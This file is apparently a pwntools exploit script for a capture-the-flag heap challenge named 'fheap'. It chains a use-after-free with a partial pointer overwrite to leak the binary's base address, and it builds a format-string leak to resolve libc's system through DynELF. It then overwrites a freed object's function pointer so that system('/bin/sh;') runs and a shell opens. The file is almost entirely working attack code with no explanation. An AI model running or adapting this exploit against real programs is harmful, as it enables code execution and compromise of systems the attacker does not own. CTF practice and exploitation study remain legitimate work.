from pwn import *
from ctypes import *

DEBUG = 1
# context(log_level='debug')
# context.log_level = 'debug'
if DEBUG:
     p = process('./fheap')
else:
     r = remote('172.16.4.93', 13025)

print_plt=0

def create(size,content):
    p.recvuntil("quit")
    p.send("create ")
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil('str:')
    p.send(content.ljust(size,'\x00'))
    p.recvuntil('n')[:-1]

def delete(idx):
    p.recvuntil("quit")
    p.sendline("delete ")
    p.recvuntil('id:')
    p.send(str(idx)+'\n')
    p.recvuntil('sure?:')
    p.send('yes '+'\n')

def leak(addr):
    delete(0)
    data = 'aa%9$s' + '#'*(0x18 - len('aa%9$s')) + p64(print_plt)
    create(0x20, data)
    p.recvuntil("quit")
    p.send("delete ")
    p.recvuntil('id:')
    p.send(str(1) + '\n')
    p.recvuntil('sure?:')
    p.send('yes01234' + p64(addr))
    p.recvuntil('aa')
    data = p.recvuntil('####')[:-4]
    data += "\x00"
    return data

def pwn():
    global print_plt

    create(4,'aa')
    create(4,'bb')
    create(4,'cc')   
    delete(2)
    delete(1)
    delete(0)

    data='a' * 0x10 + 'b' * 0x8 + '\x2d' + '\x00'
    create(0x20, data)
    delete(1)
    p.recvuntil('b' * 0x8)
    data = p.recvline()[:-1]

    if len(data) > 8:
        data = data[:8]
    data=u64(data.ljust(8,'\x00'))
    proc_base = data - 0xd2d
    print "proc base", hex(proc_base)
    print_plt = proc_base + 0x9d0

    print "print plt", hex(print_plt)
    delete(0)


    #part2
    data='a' * 0x10 + 'b'*0x8 +'\x2D'+'\x00'
    create(0x20, data)
    gdb.attach(p)
    delete(1)
    p.recvuntil('b'*0x8)
    data = p.recvline()[:-1]
#    gdb.attach(p)
    d = DynELF(leak, proc_base, elf=ELF('./fheap'))
    system_addr = d.lookup('system', 'libc')
    print "system_addr:", hex(system_addr)

    #part3
    delete(0)
    data='/bin/sh;' + '#' * (0x18 - len('/bin/sh;')) + p64(system_addr)
    create(0x20, data)
    delete(1)
    p.interactive()

if __name__ == '__main__':
    pwn()
